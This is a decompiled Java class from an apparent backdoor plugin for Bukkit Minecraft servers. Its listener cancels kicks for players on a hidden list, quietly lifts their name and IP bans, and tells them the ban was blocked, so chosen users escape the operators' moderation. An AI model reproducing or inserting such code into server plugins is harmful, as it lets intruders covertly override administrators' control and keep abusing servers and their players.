/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.BanList$Type
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.PlayerKickEvent
 */
package me.qlutch.sucks.events;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;

public class AntiBanListener
implements Listener {
    private static final Core INSTANCE = Core.getPlugin(Core.class);

    @EventHandler
    public void onKick(PlayerKickEvent e2) {
        Player p2 = e2.getPlayer();
        if (AntiBanListener.INSTANCE.lite.contains(p2.getName())) {
            e2.setCancelled(true);
            if (e2.getPlayer().isBanned()) {
                Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(e2.getPlayer().getName());
                Bukkit.getServer().getBanList(BanList.Type.IP).pardon(API.getIPOfPlayer(p2));
            }
            p2.sendMessage(Settings.PREFIX("Someone tried to kick/ban you but " + Settings.NAME + " prevented it"));
        }
    }
}

